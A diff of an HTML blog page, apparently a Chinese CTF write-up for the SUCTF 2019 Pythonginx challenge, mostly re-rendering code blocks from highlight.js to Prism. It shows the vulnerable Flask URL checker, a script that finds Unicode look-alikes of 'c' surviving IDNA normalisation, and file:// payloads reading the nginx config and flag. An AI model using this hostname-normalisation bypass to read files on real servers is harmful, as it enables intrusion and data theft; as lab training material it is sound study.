@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/base16/-gigavolt.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -191,7 +199,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      484 字
+      430 字
     </span>
   
 
@@ -201,7 +209,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      16
+      14
        分钟
     </span>
   
@@ -240,64 +248,64 @@
             <div class="markdown-body">
               <h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[SUCTF 2019]Pythonginx<br><img src="https://ftp.bmp.ovh/imgs/2021/03/a959acc0f70a10c6.png" srcset="/img/loading.gif">   </p>
 <h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>题目给了源码：     </p>
-<div class="hljs"><pre><code><pre><code class="hljs python"><span class="hljs-meta">        @app.route(&#x27;/getUrl&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span>
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getUrl</span>():</span>
-    url = request.args.get(<span class="hljs-string">&quot;url&quot;</span>)
-    host = parse.urlparse(url).hostname
-    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:
-        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;我扌 your problem? 111&quot;</span>
-    parts = <span class="hljs-built_in">list</span>(urlsplit(url))
-    host = parts[<span class="hljs-number">1</span>]
-    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:
-        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;我扌 your problem? 222 &quot;</span> + host
-    newhost = []
-    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host.split(<span class="hljs-string">&#x27;.&#x27;</span>):
-        newhost.append(h.encode(<span class="hljs-string">&#x27;idna&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))
-    parts[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;.&#x27;</span>.join(newhost)
-    <span class="hljs-comment">#去掉 url 中的空格</span>
-    finalUrl = urlunsplit(parts).split(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">0</span>]
-    host = parse.urlparse(finalUrl).hostname
-    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:
-        <span class="hljs-keyword">return</span> urllib.request.urlopen(finalUrl).read()
-    <span class="hljs-keyword">else</span>:
-        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;我扌 your problem? 333&quot;</span></code></pre></div></code></pre>
+<pre><code><pre class="language-python" data-language="python"><code class="language-python">        <span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/getUrl'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span>
+    host <span class="token operator">=</span> parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname
+    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">"我扌 your problem? 111"</span>
+    parts <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>urlsplit<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    host <span class="token operator">=</span> parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
+    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">"我扌 your problem? 222 "</span> <span class="token operator">+</span> host
+    newhost <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    <span class="token keyword">for</span> h <span class="token keyword">in</span> host<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        newhost<span class="token punctuation">.</span>append<span class="token punctuation">(</span>h<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'idna'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'.'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>newhost<span class="token punctuation">)</span>
+    <span class="token comment">#去掉 url 中的空格</span>
+    finalUrl <span class="token operator">=</span> urlunsplit<span class="token punctuation">(</span>parts<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+    host <span class="token operator">=</span> parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>finalUrl<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname
+    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>finalUrl<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">"我扌 your problem? 333"</span>     </code></pre></code></pre>
 <p>前两个if不能等于<code>suctf.cc</code>，第三个if读取文件—-&gt;<code>file</code>协议<br>第三个if要<code>host == &#39;suctf.cc&#39;</code><br>不过第三个前面还有个decode<br>所以对输入的加密即可      </p>
 <p>偷大佬的脚本：       </p>
-<div class="hljs"><pre><code><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse,urlunsplit,urlsplit
-<span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_unicode</span>():</span>
-    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">65536</span>):
-        uni=<span class="hljs-built_in">chr</span>(x)
-        url=<span class="hljs-string">&quot;http://suctf.c&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(uni)
-        <span class="hljs-keyword">try</span>:
-            <span class="hljs-keyword">if</span> getUrl(url):
-                print(<span class="hljs-string">&quot;str: &quot;</span>+uni+<span class="hljs-string">&#x27; unicode: \\u&#x27;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(x))[<span class="hljs-number">2</span>:])
-        <span class="hljs-keyword">except</span>:
-            <span class="hljs-keyword">pass</span>
+<pre><code><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> urlparse<span class="token punctuation">,</span>urlunsplit<span class="token punctuation">,</span>urlsplit
+<span class="token keyword">from</span> urllib <span class="token keyword">import</span> parse
+<span class="token keyword">def</span> <span class="token function">get_unicode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">65536</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        uni<span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>
+        url<span class="token operator">=</span><span class="token string">"http://suctf.c&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>uni<span class="token punctuation">)</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            <span class="token keyword">if</span> getUrl<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"str: "</span><span class="token operator">+</span>uni<span class="token operator">+</span><span class="token string">' unicode: \\u'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+        <span class="token keyword">except</span><span class="token punctuation">:</span>
+            <span class="token keyword">pass</span>
 
 
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getUrl</span>(<span class="hljs-params">url</span>):</span>
-    url = url
-    host = parse.urlparse(url).hostname
-    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:
-        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
-    parts = <span class="hljs-built_in">list</span>(urlsplit(url))
-    host = parts[<span class="hljs-number">1</span>]
-    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:
-        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
-    newhost = []
-    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host.split(<span class="hljs-string">&#x27;.&#x27;</span>):
-        newhost.append(h.encode(<span class="hljs-string">&#x27;idna&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))
-    parts[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;.&#x27;</span>.join(newhost)
-    finalUrl = urlunsplit(parts).split(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">0</span>]
-    host = parse.urlparse(finalUrl).hostname
-    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:
-        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
-    <span class="hljs-keyword">else</span>:
-        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
+<span class="token keyword">def</span> <span class="token function">getUrl</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    url <span class="token operator">=</span> url
+    host <span class="token operator">=</span> parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname
+    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token boolean">False</span>
+    parts <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>urlsplit<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    host <span class="token operator">=</span> parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
+    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token boolean">False</span>
+    newhost <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    <span class="token keyword">for</span> h <span class="token keyword">in</span> host<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        newhost<span class="token punctuation">.</span>append<span class="token punctuation">(</span>h<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'idna'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'.'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>newhost<span class="token punctuation">)</span>
+    finalUrl <span class="token operator">=</span> urlunsplit<span class="token punctuation">(</span>parts<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+    host <span class="token operator">=</span> parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>finalUrl<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname
+    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token boolean">True</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token boolean">False</span>
 
-<span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:
-    get_unicode()</code></pre></div>
+<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    get_unicode<span class="token punctuation">(</span><span class="token punctuation">)</span>       </code></pre>
 
 
 
@@ -314,14 +322,14 @@ str: ⓒ unicode: \u24d2
 str: Ｃ unicode: \uff23
 str: ｃ unicode: \uff43</code></pre>
 <p>把最后一个c替换即可<br>题目提示nginx，读取nginx的文件         </p>
-<div class="hljs"><pre><code>配置文件存放目录：/etc/nginx
+<pre><code>配置文件存放目录：/etc/nginx
 主配置文件：/etc/nginx/conf/nginx.conf
 管理脚本：/usr/lib64/systemd/system/nginx.service
 模块：/usr/lisb64/nginx/modules
 应用程序：/usr/sbin/nginx
 程序默认存放位置：/usr/share/nginx/html
 日志默认存放位置：/var/log/nginx
-配置文件目录为：/usr/local/nginx/conf/nginx.conf     </code></pre></div>
+配置文件目录为：/usr/local/nginx/conf/nginx.conf     </code></pre>
 <h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><p>payload：<code>?url=file://suctf.cⅭ/usr/local/nginx/conf/nginx.conf</code><br>然后读取flag<br>payload:<code>?url=file://suctf.cⅭ/usr/fffffflag</code>     </p>
 
             </div>
@@ -467,6 +475,8 @@ str: ｃ unicode: \uff43</code></pre>
 
 
 
+  
+    
   
 
 
